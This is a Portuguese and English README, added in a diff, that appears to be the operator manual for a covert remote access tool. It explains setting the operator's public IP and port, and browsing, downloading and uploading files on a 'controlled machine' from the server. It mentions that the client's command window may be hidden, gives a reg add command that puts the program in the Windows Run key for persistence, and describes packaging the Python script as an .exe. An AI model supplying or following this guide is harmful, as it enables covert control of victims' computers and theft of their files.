@@ -1,0 +1,59 @@
+MODO DE USO DO SERVIDOR
+
+URGENTE: SE FOR USAR O ARQUIVO, CERTIFIQUE-SE QUE A PORTA E O IP ESTEJAM CONFIGURADOS PARA SUA PORTA E SEU IP PUBLICO.
+
+
+Para navegar para uma pasta específica: cd C:\Users\usuario\Documents
+
+Para voltar para o diretório inicial do usuário (home directory): cd
+
+1. EXEMPLO:
+- No servidor, digite: cd C:\Windows
+
+- O cliente mudará para o diretório C:\Windows e retornará a mensagem: Changed directory to C:\Windows
+
+2. Comando download - Baixar um Arquivo do Cliente
+- No servidor, digite: download C:\Users\usuario\Documents\file.txt
+O arquivo file.txt será transferido da máquina controlada para o servidor e salvo no diretório atual do servidor. O servidor exibirá:
+[+] File 'file.txt' downloaded successfully.
+
+- Caso o Arquivo esteja no meso diretorio exemplo: cd C:\Users\usuario\Documents
+- Vc viaja para o diretorio e da o comando dir para ele listar, e caso vc encontre um arquivo "file.txt"
+- Não precisa digitar o caminho complet, Digite o comando: download file.txt
+- O MESMO SERVE PARA O COMANDO "upload".
+
+
+3. Comando upload - Enviar um Arquivo para o Cliente
+- upload C:\Users\usuario\Documents\file.txt
+O arquivo file.txt será enviado da máquina do servidor para a máquina controlada e salvo no diretório atual do cliente. O servidor exibirá:
+[+] File 'file.txt' uploaded successfully.
+
+
+4. Comando exit - Fechar a Conexão
+- No servidor, digite: exit
+
+5. Comandos Personalizados
+- No servidor digite: echo Hello World
+O comando enviará uma menssagem para o cliente no CMD (caso o CMD fique ativo e não oculto)
+
+
+Conclusão
+Agora você sabe como usar os principais comandos de navegação e transferência de arquivos entre o servidor e o cliente. O programa oferece a flexibilidade de executar comandos do shell e de gerenciar arquivos entre as duas máquinas de forma simples e eficaz.
+
+Se precisar de mais alguma ajuda ou ajustes, estou à disposição!
+
+ADICIONAR O APP NO REGEDITE
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "NomeDoPrograma" /t REG_SZ /d "C:\Caminho\Do\Seu\Programa.exe" /f
+
+
+
+CRIANDO EXE PYTHON
+CRIANDOEXEPYTHON.BAT É UM BAT CAPAZ DE TRANSFORMAR O SCRIPT PYTHON EM EXECUTAVEL
+EDITE ELE E MUDE O NOME DO ARQUIVO EXEMPLO: SE VC QUISER TRANSFORMAR UM SCRIPT PYTHON EM UM EXE, BAS COLOCAR NA MESMA PASTA DO BAT
+DEPOIS EDITE O BAT E MUDE O NOME PARA DO SCRIPT QUE DESEJA CRIAR OE EXE, DEPOIS SÓ EXECUTAR O BAT E ESPERAR. 
+
+
+CREATINGEXEPYTHON.BAT IS A BAT CAPABLE OF TRANSFORMING THE PYTHON SCRIPT INTO EXECUtable
+EDIT IT AND CHANGE THE FILE NAME EXAMPLE: IF YOU WANT TO TURN A PYTHON SCRIPT INTO AN EXE, JUST PUT IT IN THE SAME FOLDER AS THE BAT
+THEN EDIT THE BAT AND CHANGE THE NAME TO THE SCRIPT YOU WANT TO CREATE THE EXE, THEN JUST RUN THE BAT AND WAIT.
